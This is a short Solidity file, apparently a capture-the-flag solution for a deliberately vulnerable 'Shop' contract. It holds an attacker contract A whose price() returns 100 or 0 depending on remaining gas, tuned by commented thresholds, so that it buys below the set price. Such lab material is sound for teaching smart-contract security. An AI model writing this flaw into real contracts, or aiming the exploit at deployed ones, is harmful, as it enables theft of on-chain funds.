/**
 *Submitted for verification at Etherscan.io on 2021-12-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price{gas:3300}() >= price && !isSold) {
      isSold = true;
      price = _buyer.price{gas:3300}();
    }
  }

  function reset() public {
    isSold = false;
  }
}

contract A is Buyer{

  uint public gt;

  // constructor(uint gt_) public {
  //   gt = gt_;
  // }

  function price() override external view returns (uint) {
    // if (gasleft() >= gt) {
    // lower (work, revert with 10000): 2879
    // upper (not work, pass with 10000): 2880
    if (gasleft() >= 2879) {
      return 100;
    }
    return 0;
  }

  function setgt(uint gt_) public {
    gt = gt_;
  }

  function doit(Shop shop, uint gas) public {
    // shop.buy{gas:28900}();
    shop.buy{gas:gas}();
  }
}